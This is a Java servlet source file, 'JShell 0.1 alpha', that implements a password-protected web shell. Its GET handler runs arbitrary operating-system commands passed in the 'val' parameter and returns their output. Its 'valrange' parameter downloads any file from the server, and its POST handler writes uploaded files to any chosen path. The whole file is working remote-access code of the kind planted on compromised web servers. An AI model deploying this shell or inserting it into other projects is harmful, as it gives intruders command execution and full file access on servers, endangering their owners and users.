package com.github.somebody.jshell;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import org.apache.commons.lang3.StringEscapeUtils;

public class shell extends HttpServlet {

    private final ArrayList<String> formTemplate = new ArrayList<>();
    private final ArrayList<String> passList = new ArrayList<>();

    /**
     * GET results handler. For first open, shell execute.
     *
     * @param req	Servlet request
     * @param res	Servlet response
     * @throws ServletException
     * @throws IOException
     */
    @Override
    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
        // If has file download request - get it
        if (req.getParameter("valrange") != null && req.getParameter("pass") != null) {

            if (acl(req.getParameter("pass"))) {

                Path filePath = Paths.get(req.getParameter("valrange"));
                if (Files.exists(filePath)) {
                    res.setContentType(Files.probeContentType(filePath));
                    res.setContentLength((int) Files.size(filePath));
                    res.setHeader("Content-disposition", "attachment; filename=" + filePath.getFileName().toString());

                    try (BufferedInputStream fileInput = new BufferedInputStream(Files.newInputStream(filePath));
                            BufferedOutputStream resOutput = new BufferedOutputStream(res.getOutputStream())) {
                        byte buffer[] = new byte[4096];
                        int readied;

                        while ((readied = fileInput.read(buffer)) > 0) {
                            resOutput.write(buffer, 0, readied);
                        }
                    }
                } else {
                    PrintWriter htmlOut = printHead(res);
                    htmlOut.println("File not found<br>");
                    htmlOut.println("</body></html>");
                }
            }
        } else {
            PrintWriter htmlOut = printHead(res);

            // if has remote command and password - check password and exec
            if (req.getParameter("val") != null && req.getParameter("pass") != null) {
                if (acl(req.getParameter("pass"))) {
                    execCmd(htmlOut, req.getParameter("val"));
                }
            }

            htmlOut.println("</body></html>");
        }
    }

    /**
     * POST results handler. For send files.
     *
     * @param req	Servlet request
     * @param res	Servlet response
     * @throws ServletException
     * @throws IOException
     */
    @Override
    public void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
        PrintWriter htmlOut = printHead(res);

        boolean isMultiPart = ServletFileUpload.isMultipartContent(req);

        if (isMultiPart) {
            System.out.println("JShell: trying upload.");

            try {
                // default upload valies
                String fileName = null;
                String customFileName = null;
                boolean granted = false;
                InputStream fileUpload = null;

                // temporary valies
                String name, value;

                // for temporary files
                DiskFileItemFactory fileItemFactory = new DiskFileItemFactory();
                File repository = (File) this.getServletContext().getAttribute("javax.servlet.context.tempdir");
                fileItemFactory.setRepository(repository);

                // Setting up upload parser
                ServletFileUpload upload = new ServletFileUpload(fileItemFactory);
                List<FileItem> requestItems = upload.parseRequest(req);

                try {
                    for (FileItem item : requestItems) {
                        if (item.isFormField()) {
                            // parsing a form field. Searching password and alternate file name
                            name = item.getFieldName();
                            value = item.getString();

                            if (name != null && name.equals("pass")) {
                                granted = acl(value);
                            } else if (name != null && name.equals("valrange")) {
                                customFileName = value;
                            }

                            if (item.getName() != null) {
                                fileName = item.getName();
                                System.out.println("Jshell: fileName: " + fileName);
                            }
                        } else {
                            // parsing upload data
                            System.out.println("JShell: file reading to upload.");
                            fileUpload = item.getInputStream();

                            if (item.getName() != null) {
                                fileName = item.getName();
                                System.out.println("Jshell: fileName: " + fileName);
                            }
                        }
                    }

                    // if password and file is set - uploading it
                    if (fileName != null && granted && fileUpload != null) {

                        // write file. If file exists and access granted
                        String userHome = System.getProperty("user.dir") == null || System.getProperty("user.dir").isEmpty()
                                ? ((File) this.getServletContext().getAttribute("javax.servlet.context.tempdir")).toString()
                                : System.getProperty("user.dir");

                        fileName = customFileName != null && !customFileName.isEmpty() ? customFileName : userHome + "/" + fileName;

                        System.out.println("JShell: writing " + fileName);

                        byte buffer[] = new byte[4096];
                        int readied;
                        try (BufferedOutputStream fileWriter = new BufferedOutputStream(Files.newOutputStream(Paths.get(fileName)));
                                BufferedInputStream uploadInputStream = new BufferedInputStream(fileUpload)) {

                            while ((readied = uploadInputStream.read(buffer)) > 0) {
                                fileWriter.write(buffer, 0, readied);
                            }
                        }

                        htmlOut.println(StringEscapeUtils.escapeHtml4("writed to: " + fileName) + "<br>");
                        System.out.println("JShell: writed to " + fileName);
                    } else {
                        System.out.println("JShell: uploading denied");
                    }
                } catch (Exception err) {
                    throw new IOException(err);
                }
            } catch (FileUploadException uploadError) {
                throw new IOException(uploadError);
            }
        }

        htmlOut.println("</body></html>");
    }

    /**
     * Printing html form template
     *
     * @param res	Servlet response
     * @return Response writer
     */
    private PrintWriter printHead(HttpServletResponse res) throws ServletException, IOException {
        res.setContentType("text/html");
        res.setCharacterEncoding("UTF-8");

        // Write form
        PrintWriter htmlOut = res.getWriter();

        for (String item : formTemplate) {
            htmlOut.println(item);
        }

        return htmlOut;
    }

    /**
     * Checking password for valid.
     *
     * @param password Password
     * @return valid or no
     */
    private boolean acl(String password) {
        if (password == null) {
            return false;
        }

        for (String item : passList) {
            if (item.equals(password)) {
                return true;
            }
        }

        return false;
    }

    /**
     * Execute command
     *
     * @param htmlOut html output
     * @param command command to execute
     * @throws IOException error while execute
     */
    private void execCmd(PrintWriter htmlOut, String command) throws IOException {
        htmlOut.println("<hr><br><p><b> Command: " + command + ":</b><br><br><pre>");

        int exitValue = -1;

        try {
            Process proc = Runtime.getRuntime().exec(command.split(" "));

            exec buffer = new exec(htmlOut, proc);

            try {
                proc.waitFor();
            } catch (InterruptedException ignore) {
                proc.destroy();
            }

            while (!buffer.isDone()) {
                try {
                    Thread.sleep(50);
                } catch (InterruptedException ignore) {
                    break;
                }
            }

            exitValue = proc.exitValue();
            proc.destroy();
        } catch (IOException ioErr) {
            htmlOut.println(StringEscapeUtils.escapeHtml4("I/O error: " + ioErr.getLocalizedMessage()) + "<br>");
        }

        htmlOut.println("</pre><hr><br>");
        htmlOut.println("<b>Exit code: " + exitValue + "</b><br>");
    }

    /**
     * Initialisation: loading control form template and passwords list
     *
     * @throws ServletException Error while read this tiles
     */
    @Override
    public void init() throws ServletException {
        super.init();

        // Reading template file
        try (BufferedReader template = new BufferedReader(new InputStreamReader(getServletContext().getResourceAsStream("/form.html")))) {

            String buffer;
            while ((buffer = template.readLine()) != null) {
                formTemplate.add(buffer);
            }

        } catch (IOException err) {
            throw new ServletException("Unable load form file", err);
        }

        // Reading passwords list file
        try (BufferedReader passwords = new BufferedReader(new InputStreamReader(getServletContext().getResourceAsStream("/pass.txt")))) {

            String buffer;
            while ((buffer = passwords.readLine()) != null) {
                passList.add(buffer);
            }
        } catch (IOException err) {
            throw new ServletException("Unable load pass list file", err);
        }
    }

    @Override
    public String getServletInfo() {
        return "JShell 0.1 alpha";
    }
}
